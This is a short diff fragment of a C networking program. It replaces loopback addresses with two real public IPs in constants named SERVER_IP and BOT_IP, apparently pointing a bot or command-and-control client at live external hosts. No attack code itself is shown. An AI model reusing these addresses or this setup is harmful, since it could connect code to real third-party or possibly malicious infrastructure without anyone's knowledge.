@@ -7,10 +7,10 @@
 #include <netinet/in.h>
 #include <sys/socket.h>
 
-#define SERVER_IP "127.0.0.1"
+#define SERVER_IP "185.163.124.98"
 #define SERVER_PORT 12754
 
-#define BOT_IP "127.0.0.1"
+#define BOT_IP "90.26.218.15"
 
 #define MAX_URL_SIZE 1024
 
